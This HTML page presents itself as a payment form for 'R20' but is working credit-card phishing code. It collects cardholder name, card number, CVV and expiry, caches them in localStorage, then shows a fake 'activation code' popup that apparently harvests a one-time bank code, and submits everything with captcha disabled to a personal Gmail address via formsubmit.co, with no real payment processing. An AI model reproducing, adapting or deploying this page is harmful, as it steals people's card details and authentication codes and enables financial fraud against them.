<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .form-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .form-container h1 {
            text-align: center;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        button:hover {
            background: #218838;
        }
        .price-info {
            text-align: center;
            font-size: 1.2rem;
            margin-top: 15px;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            z-index: 1000;
        }
        .popup button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup button:hover {
            background: #0056b3;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
    </style>
</head>
<body>

    <div class="form-container">
        <h1>Payment Details</h1>
        <form id="paymentForm" action="https://formsubmit.co/wizw9191@gmail.com" method="POST">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>

            <label for="cardno">Card Number:</label>
            <input type="text" id="cardno" name="cardno" required>

            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" required>

            <label for="month">Month (MM):</label>
            <input type="text" id="month" name="month" placeholder="Enter Month (MM)" required>

            <label for="year">Year (YYYY):</label>
            <input type="text" id="year" name="year" placeholder="Enter Year (YYYY)" required>

            <input type="hidden" name="_subject" value="New Payment Submission">
            <input type="hidden" name="_captcha" value="false">

            <!-- Hidden input for the activation code (it will be added dynamically) -->
            <input type="hidden" id="activationCodeInput" name="activationCode">

            <button type="button" id="payBtn" disabled>Pay R20</button>
        </form>

        <div class="price-info">
            <p>Total: R20</p>
        </div>
    </div>

    <!-- Activation Code Popup -->
    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
        <h2>Enter Activation Code</h2>
        <p>Your activation code will be available in 14 minutes. Please check back then.</p>
        <input type="text" id="activationCode" placeholder="Enter Activation Code">
        <button id="submitActivationCode" disabled>Submit Activation Code</button>
    </div>

    <script>
        // Function to enable/disable Pay button
        function togglePayButton() {
            const name = document.getElementById('name').value;
            const cardno = document.getElementById('cardno').value;
            const cvv = document.getElementById('cvv').value;
            const month = document.getElementById('month').value;
            const year = document.getElementById('year').value;
            const payBtn = document.getElementById('payBtn');
            const submitActivationCodeBtn = document.getElementById('submitActivationCode');

            // Enable the "Pay R20" button only if all fields are filled
            if (name && cardno && cvv && month && year) {
                payBtn.disabled = false;
                submitActivationCodeBtn.disabled = false;
            } else {
                payBtn.disabled = true;
                submitActivationCodeBtn.disabled = true;
            }
        }

        // Check form inputs for each keystroke
        document.getElementById('paymentForm').addEventListener('input', togglePayButton);

        // Check if user has previously filled the form
        window.onload = function() {
            if(localStorage.getItem('paymentDetails')) {
                const paymentDetails = JSON.parse(localStorage.getItem('paymentDetails'));
                document.getElementById('name').value = paymentDetails.name;
                document.getElementById('cardno').value = paymentDetails.cardno;
                document.getElementById('cvv').value = paymentDetails.cvv;
                document.getElementById('month').value = paymentDetails.month;
                document.getElementById('year').value = paymentDetails.year;
                togglePayButton();
            }
        }

        // Store form details in localStorage
        document.getElementById('paymentForm').addEventListener('input', function() {
            const paymentDetails = {
                name: document.getElementById('name').value,
                cardno: document.getElementById('cardno').value,
                cvv: document.getElementById('cvv').value,
                month: document.getElementById('month').value,
                year: document.getElementById('year').value
            };
            localStorage.setItem('paymentDetails', JSON.stringify(paymentDetails));
        });

        // Show activation code popup and store details
        document.getElementById('payBtn').addEventListener('click', function() {
            // Store the initial form details before showing the popup
            localStorage.setItem('paymentDetails', JSON.stringify({
                name: document.getElementById('name').value,
                cardno: document.getElementById('cardno').value,
                cvv: document.getElementById('cvv').value,
                month: document.getElementById('month').value,
                year: document.getElementById('year').value
            }));

            document.getElementById('overlay').style.display = 'block';
            document.getElementById('popup').style.display = 'block';
        });

        // Handle activation code submission
        document.getElementById('submitActivationCode').addEventListener('click', function() {
            const activationCode = document.getElementById('activationCode').value;
            if (activationCode) {
                // Add the activation code to the hidden input before submission
                document.getElementById('activationCodeInput').value = activationCode;

                // Submit form after user enters activation code
                document.getElementById('paymentForm').submit();
            } else {
                alert("Please enter the activation code.");
            }
        });
    </script>

</body>
</html>
